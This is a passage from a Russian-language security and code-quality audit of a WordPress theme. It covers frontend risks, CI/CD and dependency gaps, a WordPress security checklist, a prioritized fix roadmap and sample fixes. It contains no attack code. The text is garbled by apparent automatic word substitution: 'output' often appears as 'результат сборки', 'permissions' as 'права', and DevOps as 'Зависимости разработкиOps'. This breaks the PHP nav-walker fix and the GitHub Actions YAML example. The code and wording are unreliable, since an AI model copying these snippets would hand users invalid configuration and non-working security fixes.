7. Много inline styles/scripts.
8. Тема содержит интеграции, которые должны жить в plugin.
9. Некоторые файлы есть, но не используются (`inc/search-bar.php` исключается из package и дублирует header logic).
10. Есть duplicate related posts: PHP related block + React related posts root.

---

# 6. Frontend Review

## FE-001 — `BurgerMenu` использует `dangerouslySetInnerHTML`

**Файл:** `assets/js/components/BurgerMenu.jsx`

**Участок:**
- `assets/js/components/BurgerMenu.jsx:96`

**Проблема:**

```jsx
<div dangerouslySetInnerHTML={ { __html: items } } />
```

`items` берётся из `#mobile-menu-html`, то есть из HTML, сгенерированного WordPress. Сейчас это в основном доверенный server HTML, но при непоследовательном escaping в PHP это становится amplification point.

**Риск:**

Если в menu HTML попадёт malicious attribute/payload, React вставит его как HTML.

**Критичность:** `НИЗКИЙ/СРЕДНИЙ`

**Как исправить:**

- рендерить меню на PHP без React innerHTML;
- или передавать JSON menu model и рендерить React-элементами;
- или санитизировать HTML перед вставкой, но лучше не использовать raw HTML вообще.

---

## FE-002 — Duplicate related posts rendering

**Файл:** `single.php`

**Участки:**
- `single.php:126-174` — PHP related posts
- `single.php:179` — React root для RelatedPosts

**Проблема:**

Страница single рендерит related posts дважды:
1. серверный WP_Query блок;
2. React REST fetch блок.

**Риск:**

- дубли UI;
- лишний REST запрос;
- хуже performance;
- две независимые реализации одной фичи.

**Критичность:** `НИЗКИЙ/СРЕДНИЙ`

**Как исправить:**

Выбрать один вариант:
- server-side related posts;
- или React related posts.

Для WordPress-темы лучше server-side, чтобы SEO/SSR не страдали.

---

## FE-003 — `RelatedPosts` доверяет REST fields без нормализации URL

**Файл:** `assets/js/components/RelatedPosts.jsx`

**Участки:**
- `RelatedPosts.jsx:17-24`
- `RelatedPosts.jsx:42-64`

**Проблема:**

`href={ post.link }` и `src={ исходник_url }` берутся из REST API. Обычно это доверенный WordPress результат сборки, но строгий подход требует нормализации и резервный сценарий.

**Критичность:** `НИЗКИЙ`

**Как исправить:**

- валидировать, что URL same-origin или http/https;
- проверять `Array.isArray(data)`;
- резервный сценарий при ошибке REST.

---

## FE-004 — `ThemeToggle` не валидирует значение из localStorage

**Файл:** `assets/js/components/ThemeToggle.jsx`

**Участки:**
- `ThemeToggle.jsx:35-38`
- `ThemeToggle.jsx:45-51`

**Проблема:**

`localStorage.getItem(STORAGE_KEY)` используется без проверки на `MODES`.

Если туда попадёт мусор, UI labels будут `undefined`, а `cycle` может работать неочевидно.

**Критичность:** `НИЗКИЙ`

**Как исправить:**

```js
const saved = localStorage.getItem( STORAGE_KEY );
return MODES.includes( saved ) ? saved : 'auto';
```

---

# 7. Зависимости разработкиOps / CI/CD Review

## 7.1. CI собирает, но не проверяет качество

Текущий workflow:
- checkout;
- setup node;
- `npm ci --legacy-peer-deps`;
- `npm run сборка`;
- package;
- changelog;
- release.

Нет:
- `composer install`;
- `composer проверка линтером`;
- `npm run проверка линтером:js`;
- `npm run проверка линтером:css`;
- `npm audit`;
- `composer audit`;
- artifact validation;
- package smoke test.

**Рекомендация:** release job не должен быть зелёным, если PHP/JS/CSS проверка линтером не пройдены.

---

## 7.2. `--legacy-peer-deps` скрывает зависимость-конфликты

**Файл:** `.github/workflows/сборка.yaml`

**Участок:**
- `.github/workflows/сборка.yaml:31-34`

**Проблема:**

`npm ci --legacy-peer-deps` может скрывать реальные peer зависимость incompatibilities. Иногда это необходимо, но должно быть документировано.

**Критичность:** `НИЗКИЙ/СРЕДНИЙ`

**Как исправить:**

- попробовать убрать `--legacy-peer-deps`;
- если невозможно — зафиксировать причину в комментарии;
- добавить lockfile maintenance.

---

## 7.3. Версии проекта расходятся

**Файлы:**
- `style.css`
- `package.json`
- `package-lock.json`

**Факты:**
- `style.css`: `Version: 1.2.37`
- `package.json`: `"version": "1.0.0"`
- `package-lock.json`: root package version `1.0.0`

**Проблема:**

Версия темы и npm package version не синхронизированы.

**Риск:**

- confusion в release/debug;
- неправильные artifacts;
- changelog/version automation ломается.

**Критичность:** `НИЗКИЙ`

**Как исправить:**

- единый исходник of truth;
- script для bump version в `style.css`, `package.json`, `package-lock.json`;
- не делать silent `sed` внутри prod.

---

## 7.4. `Makefile prod` меняет `style.css`

**Файл:** `Makefile`

**Участки:**
- `Makefile:21-25`

**Проблема:**

`make prod` инкрементирует версию прямо в `style.css`.

**Риск:**

- dirty working tree;
- несинхронизированный package-lock;
- CI/local divergence.

**Критичность:** `НИЗКИЙ/СРЕДНИЙ`

**Как исправить:**

- отдельная команда `make bump-version`;
- release через tag;
- версия должна приходить из Git tag или единого manifest.

---

# 8. Проверка зависимостей

## Проверенные зависимости верхнего уровня

Из `package.json` / `package-lock.json`:

Зависимости выполнения:
- `highlight.js`
- `react`
- `react-dom`

Зависимости разработки:
- `@tailwindcss/postcss`
- `@wordpress/scripts`
- `autoprefixer`
- `postcss`
- `tailwindcss`

PHP dev:
- `wp-coding-standards/wpcs`
- `dealerdirect/phpcodesniffer-composer-installer`
- `phpcompatibility/phpcompatibility-wp`

## Основные проблемы

1. Не видно Dependabot/Renovate config.
2. Не видно automated vulnerability scan.
3. Используются caret-ranges (`^`), что нормально для dev, но требует lockfile discipline.
4. `@wordpress/scripts` тянет большую зависимость graph.
5. `package-lock.json` большой; без `npm audit` нельзя честно утверждать, что нет CVE во всём дереве.

## Рекомендация

Добавить `.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
  - package-ecosystem: "composer"
    directory: "/"
    schedule:
      interval: "weekly"
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

Добавить CI:

```bash
npm audit --audit-level=moderate
composer audit
```

---

# 9. WordPress Безопасность Checklist

| Категория | Статус | Комментарий |
|---|---|---|
| SQL injection | `ОК` | Raw SQL не найден. Используются WP_Query/get_posts. |
| CSRF | `ЧАСТИЧНО_ОК` | VK import и Matrix form имеют nonce. Других dangerous POST endpoints не найдено. |
| Capability checks | `ЧАСТИЧНО_ОК` | VK admin page защищена `manage_options`; Matrix публичный endpoint требует отдельной abuse policy. |
| XSS escaping | `ТРЕБУЕТ_ИСПРАВЛЕНИЯ` | Есть много `esc_*`, но также есть raw title/term/menu результат сборкиs. |
| SSRF | `ЧАСТИЧНЫЙ_РИСК` | VK media download и Matrix homeserver URL требуют hardening. |
| File upload | `СРЕДНИЙ_RISK` | SVG upload custom sanitizer; VK sideload external images. |
| Secrets | `ТРЕБУЕТ_ИСПРАВЛЕНИЯ` | Docker dev secrets жёстко заданные; Matrix/VK tokens ожидаются как constants, но нужна policy. |
| REST API | `НИЗКИЙ_RISK` | React использует WP REST для related posts; кастомных REST endpoints не найдено. |
| Цепочка поставки | `ВЫСОКИЙ_RISK` | Custom updater без подписи/хэша; CI права широкие. |
| Logging/audit | `ОТСУТСТВУЕТ` | Для Matrix/VK/admin actions нужен audit log. |

---

# 10. Что не найдено

В ходе статического аудита **не обнаружены**:

- raw SQL injection через `$wpdb->query()` / interpolated SQL;
- `eval()`;
- unsafe `unserialize()` пользовательского ввода;
- прямой upload endpoint без nonce/capability;
- публичный admin AJAX endpoint без nonce;
- явная утечка `MATRIX_ADMIN_TOKEN` или `VK_API_TOKEN` в Frontend HTML;
- прямой вывод Matrix/VK token в клиент, кроме частичного показа VK token в admin-only интерфейсе.

Важно: отсутствие найденного raw SQL/eval не означает, что проект production-safe. Основные риски находятся в цепочка поставки, Matrix abuse, escaping consistency, Зависимости разработкиOps и архитектуре.

---

# 11. Приоритетный roadmap исправлений

## P0 — исправить до любого production

1. **Отключить принудительный автообновление темы.**
2. **Добавить подпись/хэш к манифест обновления.**
3. **Ограничить `download_url` только доверенным доменом.**
4. **Закрыть публичную Matrix-регистрацию от массового abuse:**
   - CAPTCHA;
   - invite codes;
   - лимит успешных регистраций;
   - email verification или admin approval.
5. **Сделать Matrix form state на отдельную сессию/посетителя, не global transients.**
6. **Убрать жёстко заданные Docker credentials из потенциально переиспользуемых конфигов.**
7. **Сузить GitHub Actions права.**

## P1 — исправить перед релизом темы

1. Пройти все templates и заменить raw результат сборки на экранирование с учётом контекста.
2. Исправить `inc/nav-walker.php`.
3. Исправить `inc/breadcrumbs.php`.
4. Убрать public `/proc/uptime`.
5. Убрать inline JS/event handlers.
6. Перестроить Frontend исходник/сборка layout.
7. Убрать duplicate related posts.
8. Добавить CI:
   - PHPCS/WPCS;
   - JS проверка линтером;
   - CSS проверка линтером;
   - npm audit;
   - composer audit.

## P2 — архитектурная стабилизация

1. Вынести Matrix/VK/updater logic в plugin.
2. Ввести сервисные классы.
3. Добавить логирование:
   - Matrix registration attempts;
   - VK import results;
   - updater checks/downloads.
4. Добавить background jobs для VK import.
5. Добавить cache для Matrix stats.
6. Добавить Dependabot/Renovate.
7. Добавить чеклист релиза и проверка артефакта.

## P3 — качество и UX

1. Убрать newsletter form без backend.
2. Синхронизировать версии `style.css`, `package.json`, `package-lock.json`.
3. Улучшить accessibility мобильного меню.
4. Убрать dead file `inc/search-bar.php`, если он не используется.
5. Привести форматирование PHP к WPCS везде.
6. Добавить дымовые тесты для critical pages:
   - home;
   - single post;
   - search;
   - Matrix registration;
   - VK import admin page.

---

# 12. Рекомендуемая целевая архитектура

```text
scam-dev/
  theme/
    functions.php
    templates/
    template-parts/
    assets/
      js/src/
      scss/
    inc/
      setup.php
      enqueue.php
      customizer.php
      rendering helpers only

  plugin: scam-dev-core/
    src/
      Matrix/
        MatrixAdminClient.php
        MatrixRegistrationController.php
        MatrixRateLimiter.php
        MatrixFormState.php
      VK/
        VkClient.php
        VkImporter.php
        VkImportAdminPage.php
      Updater/
        SignedManifestVerifier.php
        ThemeUpdater.php
      Безопасность/
        AuditLogger.php
```

Правило:

- **Theme:** отображение.
- **Plugin:** бизнес-логика, внешние API, привилегированные действия.
- **CI:** не выпускает ZIP, если security/проверка линтером/test не прошли.

---

# 13. Пример исправлений

## 13.1. Escaping helper examples

```php
<h1><?php echo esc_html( get_the_title() ); ?></h1>

<a href="<?php echo esc_url( get_permalink() ); ?>">
    <?php echo esc_html( get_the_title() ); ?>
</a>

<time datetime="<?php echo esc_attr( get_the_date( 'c' ) ); ?>">
    <?php echo esc_html( get_the_date() ); ?>
</time>
```

## 13.2. Secure nav walker title

```php
$title_text = apply_filters( 'the_title', $data_object->title, $data_object->ID );
$title      = esc_html( $title_text );

if ( $has_kids ) {
    $title .= ' ' . $dropdown_icon_svg;
}

$результат сборки .= '<a' . $attributes . '>' . $title . '</a>';
```

## 13.3. Safer Matrix ограничение частоты запросов

```php
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$key = 'matrix_reg_attempt_' . hash_hmac( 'sha256', $ip, AUTH_SALT );

$attempts = (int) get_transient( $key );
if ( $attempts >= 5 ) {
    return self::fail( 'Слишком много попыток. Попробуйте позже.' );
}

set_transient( $key, $attempts + 1, 15 * MINUTE_IN_SECONDS );
```

## 13.4. CI минимально необходимые права

```yaml
права:
  contents: read

jobs:
  сборка:
    права:
      contents: read

  release:
    if: startsWith(github.ref, 'refs/tags/v')
    права:
      contents: write
```

## 13.5. Docker dev-only ports

```yaml
ports:
  - "127.0.0.1:8080:80"

# mysql/phpmyadmin only in debug profile
profiles:
  - debug
```

---

# 14. Итоговый verdict

```text
ВЕРДИКТ: ТРЕБУЕТ_ИСПРАВЛЕНИЙ_ДО_PRODUCTION
```

Проект имеет хорошую основу и видно, что безопасность уже частично улучшали: есть nonce/capability checks, WPCS-конфиг, sanitizer для SVG, экранирование в большом количестве мест, release packaging.

Но текущая версия не проходит строгий production-аудит из-за трёх главных блокеров:

1. **Цепочка поставки updater без подписи и с автообновление.**
2. **Публичная Matrix-регистрация без нормальной anti-abuse модели.**
3. **Сломанная/нечистая Frontend исходник/сборка архитектура.**

После исправления P0/P1 проект можно повторно ревьюить. Ожидаемый результат после исправлений:

```text
Безопасность:        7.5–8.0 / 10
Архитектура:    7.0–7.5 / 10
Качество кода:    7.0–8.0 / 10
production Ready: приемлемо для контролируемого production
```
